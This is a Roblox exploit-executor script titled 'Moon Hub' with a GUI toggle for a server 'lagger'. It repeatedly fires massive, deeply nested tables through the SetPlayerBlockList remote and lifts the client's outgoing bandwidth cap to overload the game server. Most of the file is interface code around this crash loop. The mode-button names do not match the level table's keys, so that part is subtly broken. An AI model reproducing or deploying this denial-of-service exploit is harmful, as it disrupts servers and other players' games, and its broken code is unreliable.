-- // 1 (Services) //
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

-- // 2 (Player + Config) //
local player = Players.LocalPlayer
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local ConfigFile = "moonhublagger.json"

-- Varsayılan Ayarlar
local boundKey = Enum.KeyCode.M
local nivelActual = "Low"

-- // 3 (Lagger Güç Ayarları — Mobil ve PC için optimize edildi) //
local NIVELES = {
	Low  = { TableIncrease = isMobile and 150 or 200, LoopWaitTime = 0.4 },
	Mid  = { TableIncrease = isMobile and 240 or 265, LoopWaitTime = 0.15 },
	High = { TableIncrease = isMobile and 290 or 320, LoopWaitTime = 0.05 }
}

-- Config Kaydetme ve Yükleme fonksiyonları
local function SaveConfig()
	local data = {
		Keybind = boundKey and boundKey.Name or "M",
		Nivel = nivelActual
	}
	pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
	if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
		pcall(function()
			local data = HttpService:JSONDecode(readfile(ConfigFile))
			boundKey = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
			nivelActual = data.Nivel or "Low"
		end)
	end
end
LoadConfig()

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

-- // 4 (Remote resolver) //
local function resolveRemote(path)
	if not path or path == "" then return nil end
	local obj = game
	local cleaned = path:gsub("^game%.", "")
	for segment in cleaned:gmatch("[^%.]+") do
		if obj then
			obj = obj[segment]
		else
			return nil
		end
	end
	return obj
end

-- // 5 (Bomb builder) //
local function getmaxvalue(val)
	local mainvalueifonetable = 499999
	if type(val) ~= "number" then return nil end
	return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease)
	local maintable = {}
	local spammedtable = {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for i = 1, tableincrease do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	local maximum = getmaxvalue(tableincrease) or 9999999
	for i = 1, maximum do
		table.insert(maintable, spammedtable)
		if i % 5000 == 0 then task.wait() end
	end
	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
	if remote then
		pcall(function()
			if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
				remote:FireServer(maintable)
			elseif remote:IsA("RemoteFunction") then
				remote:InvokeServer(maintable)
			end
		end)
	end
end

-- // 6 (Lagger state + control) //
local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
	while laggerEnabled do
		pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
		task.spawn(function()
			local config = NIVELES[nivelActual]
			bomb(config.TableIncrease)
		end)
		local config = NIVELES[nivelActual]
		task.wait(math.max(config.LoopWaitTime, 0.05))
	end
end

local function stopLaggerLoop()
	laggerEnabled = false
	if laggerThread then
		pcall(function() coroutine.close(laggerThread) end)
		laggerThread = nil
	end
end

local function startLagger()
	if laggerThread then return end
	laggerEnabled = true
	laggerThread = coroutine.create(startLaggerLoop)
	coroutine.resume(laggerThread)
end

-- // 7 (Strip textures for performance) //
for _, v in pairs(workspace:GetDescendants()) do
	if v:IsA("Texture") or v:IsA("Decal") then
		v:Destroy()
	elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
		v.Material = Enum.Material.SmoothPlastic
	end
end

-- // 8 (Cleanup + HiddenUI folder) //
if not CoreGui:FindFirstChild("HiddenUI") then
	local f = Instance.new("Folder")
	f.Name = "HiddenUI"
	f.Parent = CoreGui
end
if CoreGui.HiddenUI:FindFirstChild("CrasherUI_Toggle") then
	CoreGui.HiddenUI.CrasherUI_Toggle:Destroy()
end

-- // 9 (ScreenGui) //
local gui = Instance.new("ScreenGui")
gui.Name = "CrasherUI_Toggle"
gui.ResetOnSpawn = false
gui.Parent = CoreGui.HiddenUI

-- // 10 (Animated gradient stroke helper) //
local function createAnimatedStroke(parent, thickness, speed)
	local s = Instance.new("UIStroke")
	s.Thickness = thickness or 1.5
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Color = Color3.new(1, 1, 1)
	s.Parent = parent

	local g = Instance.new("UIGradient")
	g.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 40, 90)),
		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 150, 255)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 150, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 40, 90)),
	})
	g.Rotation = 0
	g.Parent = s

	task.spawn(function()
		local spd = speed or 1.2
		while parent.Parent do
			g.Rotation = (g.Rotation + spd) % 360
			task.wait()
		end
	end)

	return s, g
end

-- // 11 (Main frame — Koyu Mavi Tema) //
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 220, 0, 175)
main.Position = UDim2.new(0.5, -110, 0.5, -87)
main.BackgroundColor3 = Color3.fromRGB(12, 16, 35)
main.BackgroundTransparency = 0.2
main.ClipsDescendants = true
main.Active = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

createAnimatedStroke(main, 2, 0.8)

-- // 13 (Title with Blue/White gradient - Moon Hub) //
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 12, 0, 5)
title.BackgroundTransparency = 1
title.Text = "Moon Hub"
title.Font = Enum.Font.GothamBlack
title.TextSize = 16
title.TextColor3 = Color3.new(1, 1, 1)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 180, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 255)),
})
titleGrad.Parent = title

task.spawn(function()
	while main.Parent do
		titleGrad.Rotation = (titleGrad.Rotation + 1.2) % 360
		task.wait()
	end
end)

-- // 15 (Minimize button) //
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 24, 0, 24)
minBtn.Position = UDim2.new(1, -32, 0, 8)
minBtn.BackgroundColor3 = Color3.fromRGB(25, 30, 60)
minBtn.AutoButtonColor = false
minBtn.Font = Enum.Font.GothamBlack
minBtn.Text = "-"
minBtn.TextSize = 14
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.Parent = main

Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

local minimized = false
minBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	TweenService:Create(main, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		Size = minimized and UDim2.new(0, 220, 0, 40) or UDim2.new(0, 220, 0, 175)
	}):Play()
	minBtn.Text = minimized and "+" or "-"
end)

-- // 16 (Toggle row — Lagger) //
local toggleRow = Instance.new("Frame")
toggleRow.Size = UDim2.new(1, -20, 0, 34)
toggleRow.Position = UDim2.new(0, 10, 0, 42)
toggleRow.BackgroundColor3 = Color3.fromRGB(25, 35, 65)
toggleRow.Parent = main

Instance.new("UICorner", toggleRow)
createAnimatedStroke(toggleRow, 1, 1.2)

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Size = UDim2.new(1, -60, 1, 0)
toggleLabel.Position = UDim2.new(0, 10, 0, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Text = "Lagger"
toggleLabel.Font = Enum.Font.GothamBlack
toggleLabel.TextSize = 13
toggleLabel.TextColor3 = Color3.new(1, 1, 1)
toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
toggleLabel.Parent = toggleRow

-- // 17 (Toggle switch) //
local switchBg = Instance.new("Frame")
switchBg.Size = UDim2.new(0, 36, 0, 18)
switchBg.Position = UDim2.new(1, -46, 0.5, -9)
switchBg.BackgroundTransparency = 1
switchBg.Parent = toggleRow

Instance.new("UICorner", switchBg).CornerRadius = UDim.new(0, 9)
createAnimatedStroke(switchBg, 2, 1.5)

local switchKnob = Instance.new("Frame")
switchKnob.Size = UDim2.new(0, 14, 0, 14)
switchKnob.Position = UDim2.new(0, 2, 0.5, -7)
switchKnob.BackgroundColor3 = Color3.new(1, 1, 1)
switchKnob.Parent = switchBg

Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(0, 7)

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = ""
toggleBtn.Parent = toggleRow

local function setToggle(newState)
	laggerEnabled = newState
	local goal = newState and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
	local color = newState and Color3.fromRGB(0, 120, 255) or Color3.fromRGB(40, 45, 70)
	TweenService:Create(switchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
	TweenService:Create(switchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()

	if newState then
		startLagger()
	else
		stopLaggerLoop()
	end
end

toggleBtn.MouseButton1Click:Connect(function()
	setToggle(not laggerEnabled)
end)

-- // 19 (Keybind row) //
local kbRow = Instance.new("Frame")
kbRow.Size = UDim2.new(1, -20, 0, 34)
kbRow.Position = UDim2.new(0, 10, 0, 82)
kbRow.BackgroundColor3 = Color3.fromRGB(25, 35, 65)
kbRow.Parent = main

Instance.new("UICorner", kbRow)
createAnimatedStroke(kbRow, 1, 1.2)

local kbLabel = Instance.new("TextLabel")
kbLabel.Size = UDim2.new(1, -80, 1, 0)
kbLabel.Position = UDim2.new(0, 10, 0, 0)
kbLabel.BackgroundTransparency = 1
kbLabel.Text = "Keybind"
kbLabel.Font = Enum.Font.GothamBlack
kbLabel.TextSize = 13
kbLabel.TextColor3 = Color3.new(1, 1, 1)
kbLabel.TextXAlignment = Enum.TextXAlignment.Left
kbLabel.Parent = kbRow

-- // 20 (Keybind button) //
local kbBtn = Instance.new("TextButton")
kbBtn.Size = UDim2.new(0, 65, 0, 22)
kbBtn.Position = UDim2.new(1, -73, 0.5, -11)
kbBtn.BackgroundColor3 = Color3.fromRGB(40, 50, 85)
kbBtn.AutoButtonColor = false
kbBtn.Font = Enum.Font.GothamBlack
kbBtn.Text = "[ " .. boundKey.Name .. " ]"
kbBtn.TextSize = 10
kbBtn.TextColor3 = Color3.new(1, 1, 1)
kbBtn.Parent = kbRow

Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 5)

-- // 21 (Keybind listener) //
local listeningForKey = false

kbBtn.MouseButton1Click:Connect(function()
	listeningForKey = true
	kbBtn.Text = "[ ... ]"
end)

UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if listeningForKey then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			boundKey = input.KeyCode
			kbBtn.Text = "[ " .. tostring(input.KeyCode):sub(14) .. " ]"
			listeningForKey = false
			SaveConfig()
		end
		return
	end
	if boundKey and input.KeyCode == boundKey then
		setToggle(not laggerEnabled)
	end
end)

-- // 22 (Low, Mid, High Mod Seçenekleri) //
local modeRow = Instance.new("Frame")
modeRow.Size = UDim2.new(1, -20, 0, 38)
modeRow.Position = UDim2.new(0, 10, 0, 122)
modeRow.BackgroundTransparency = 1
modeRow.Parent = main

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.Parent = modeRow

local buttons = {}
local function updateModeButtons()
	for name, btn in pairs(buttons) do
		if nivelActual == name then
			TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
			btn.UIStroke.Color = Color3.fromRGB(255, 255, 255)
		else
			TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 35, 65)}):Play()
			btn.UIStroke.Color = Color3.fromRGB(50, 65, 110)
		end
	end
end

local function createModeButton(name, order)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 62, 1, 0)
	btn.LayoutOrder = order
	btn.BackgroundColor3 = Color3.fromRGB(25, 35, 65)
	btn.Font = Enum.Font.GothamBlack
	btn.Text = name
	btn.TextSize = 11
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.AutoButtonColor = false
	btn.Parent = modeRow

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	local s = Instance.new("UIStroke", btn)
	s.Thickness = 1.2
	
	buttons[name] = btn

	btn.MouseButton1Click:Connect(function()
		nivelActual = name
		updateModeButtons()
		SaveConfig()
	end)
end

createModeButton("LOW", 1)
createModeButton("MID", 2)
createModeButton("HIGH", 3)
updateModeButtons()

-- // 23 (Draggable with screen clamp) //
do
	local dg, ds, sp = false, nil, nil

	local function clampPosition(pos)
		local ss = workspace.CurrentCamera.ViewportSize
		local gs = main.AbsoluteSize
		local x = math.clamp(pos.X.Offset, 0, math.max(0, ss.X - gs.X))
		local y = math.clamp(pos.Y.Offset, 0, math.max(0, ss.Y - gs.Y))
		return UDim2.new(0, x, 0, y)
	end

	main.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and not minimized then
			dg = true
			ds = input.Position
			sp = main.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dg and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			if minimized then dg = false return end
			local delta = input.Position - ds
			main.Position = clampPosition(UDim2.new(sp.X.Scale, sp.X.Offset + delta.X, sp.Y.Scale, sp.Y.Offset + delta.Y))
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dg = false
		end
	end)
end
